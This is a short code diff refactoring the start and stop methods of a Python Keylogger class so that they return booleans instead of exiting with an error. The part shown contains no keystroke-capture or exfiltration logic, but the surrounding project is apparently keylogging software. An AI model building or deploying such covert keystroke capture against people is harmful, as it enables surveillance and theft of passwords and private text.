@@ -43,22 +43,21 @@ class Keylogger:
         self.__active = False
 
 
-    def start(self):
+    def start(self) -> bool:
         if self.__active:
-            print("ERROR: Calling start() on keylogger that is already running.", file=stderr)
-            exit(1)
+            return False
         self.__active = True
         self.__thread = Thread(target=self.__read_keystrokes)
-        self.__thread.start()
+        self.__thread.start()   
+        return True
 
 
-    def stop(self):
+    def stop(self) -> bool:
         if not self.__active:
-            print("ERROR: Calling stop() on keylogger that is not running.", file=stderr)
-            exit(1)
+            return False
         self.__stop = True
         self.__active = False
-    
+        return True
 
     def get_keylog(self):
         keylog = ""
